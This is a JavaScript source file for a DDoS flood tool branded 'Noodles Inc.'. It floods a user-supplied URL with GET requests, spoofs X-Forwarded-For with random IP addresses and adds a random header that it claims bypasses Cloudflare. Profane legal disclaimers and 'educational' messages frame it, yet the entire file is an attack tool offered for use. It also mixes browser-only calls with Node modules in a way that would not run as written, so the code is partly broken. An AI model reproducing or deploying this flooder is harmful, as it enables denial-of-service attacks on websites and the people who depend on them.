// WARNING: This tool is for EDUCATIONAL/PENETRATION TESTING PURPOSES ONLY.
// Misuse can result in SEVERE legal consequences, including imprisonment.
// Noodles Inc. is NOT responsible for your FUCKING actions. Use at your own risk.
// By using this tool, you acknowledge that you are SOLELY responsible for any damage or legal issues caused.

// DISCLAIMER from Noodles Inc.: We are NOT responsible for ANYTHING.

const colors = {
    darkGreen: '\x1b[32m',
    purple: '\x1b[35m',
    darkRed: '\x1b[31m',
    darkBlue: '\x1b[34m',
    reset: '\x1b[0m'
};

const targetURL = document.getElementById('targetURL').value; // Grab from HTML input
const numRequests = document.getElementById('numRequests').value || 1000; // Grab from HTML, default to 1000
const logFile = 'ddos_log.txt'; // Keep it for potential "accountability"

const fs = require('fs');
const http = require('http');
const https = require('https');
const { URL } = require('url');
const crypto = require('crypto'); // For bypassing Cloudflare

// Explicit User Consent - No means site closes
if (!confirm("WARNING: This tool is HIGHLY ILLEGAL if used without authorization. Do you accept ALL responsibility for your actions?\n\nNoodles Inc. is NOT liable. Press OK to proceed or CANCEL to self-destruct.")) {
    window.close();
}

// Log all actions (because fuck it, we have to)
console.log("%c[Noodles] Initializing DDoS Tool...", "color: darkgreen;");

if (!targetURL) {
    console.log("%c[Noodles] ERROR: Target URL is required.", "color: darkred;");
    alert("Target URL is required.  You dumbass.");
    // Educational Information - Inject into HTML
    document.getElementById('educationalInfo').innerHTML = "<p style='color: darkred;'>You forgot the fucking URL, idiot.  Try again.</p>";
    throw new Error("Target URL is required.");
}

const parsedURL = new URL(targetURL);
const protocol = parsedURL.protocol === 'https:' ? https : http;
const hostname = parsedURL.hostname;
const path = parsedURL.pathname;

console.log(`%c[Noodles] Target: ${targetURL} | Requests: ${numRequests}`, "color: darkblue;");

function log(message) {
    const timestamp = new Date().toISOString();
    const logMessage = `[${timestamp}] ${message}\n`;
    fs.appendFile(logFile, logMessage, (err) => {
        if (err) {
            console.error("%c[Noodles] ERROR: Could not write to log file!", "color: darkred;", err);
        }
    });
    console.log("%c[Noodles] " + logMessage, "color: purple;");
}

let requestsSent = 0;
let floodRunning = false; // Control the flood with start/stop

// Function to generate a random string for bypassing Cloudflare
function generateRandomString(length) {
    return crypto.randomBytes(Math.ceil(length / 2)).toString('hex').slice(0, length);
}

function flood() {
    if (!floodRunning) {
        log("[Noodles] Flood stopped.");
        return;
    }

    if (requestsSent >= numRequests) {
        log("[Noodles] Flood completed.");
        return;
    }

    const randomString = generateRandomString(32); // Generate a random string for each request

    const options = {
        hostname: hostname,
        path: path,
        method: 'GET', // Or POST, HEAD, etc. – Make it configurable in the UI
        headers: {
            'User-Agent': `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36`, // Updated user agent
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Cache-Control': 'no-cache',  // Prevent caching
            'Pragma': 'no-cache', // Another prevent caching
            'X-Forwarded-For': `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`, // Spoof IP
            'DNT': '1', // Do Not Track
            'Sec-GPC': '1', //  Global Privacy Control
             'Random-String': randomString // Add random string to bypass Cloudflare
        }
    };

    const req = protocol.request(options, (res) => {
        log(`Request sent: ${res.statusCode} ${res.statusMessage}`);
    });

    req.on('error', (error) => {
        log(`Request error: ${error.message}`);
    });

    req.end();
    requestsSent++;
    document.getElementById('requestsSent').innerText = requestsSent; // Update UI

    setTimeout(flood, 0); // Adjust delay as needed – Make configurable
}

// Start Flood Function (Called from button)
function startFlood() {
    floodRunning = true;
    requestsSent = 0; // Reset count
    document.getElementById('requestsSent').innerText = requestsSent;
    log("[Noodles] Starting the flood...");

    // Start Timer
    let startTime = Date.now();
    document.getElementById('timer').innerText = "00:00:00";
    let timerInterval = setInterval(() => {
        let elapsedTime = Date.now() - startTime;
        let seconds = Math.floor((elapsedTime / 1000) % 60);
        let minutes = Math.floor((elapsedTime / (1000 * 60)) % 60);
        let hours = Math.floor((elapsedTime / (1000 * 60 * 60)) % 24);

        seconds = (seconds < 10) ? "0" + seconds : seconds;
        minutes = (minutes < 10) ? "0" + minutes : minutes;
        hours = (hours < 10) ? "0" + hours : hours;

        document.getElementById('timer').innerText = hours + ":" + minutes + ":" + seconds;
    }, 1000);

    flood(); // Start the actual flooding
}

// Stop Flood Function (Called from button)
function stopFlood() {
    floodRunning = false;
    log("[Noodles] Stopping the flood...");
}

// Event Listeners (Example - Hook up to buttons in HTML)
// Example: <button onclick="startFlood()">Start</button>
//          <button onclick="stopFlood()">Stop</button>

// Example: Inject some educational info... (to be populated in HTML)
document.getElementById('educationalInfo').innerHTML = "<p style='color: darkgreen;'>This tool sends a large number of requests to a target URL.  It's fucking illegal if you don't own the site or have permission, you dumbass.</p>";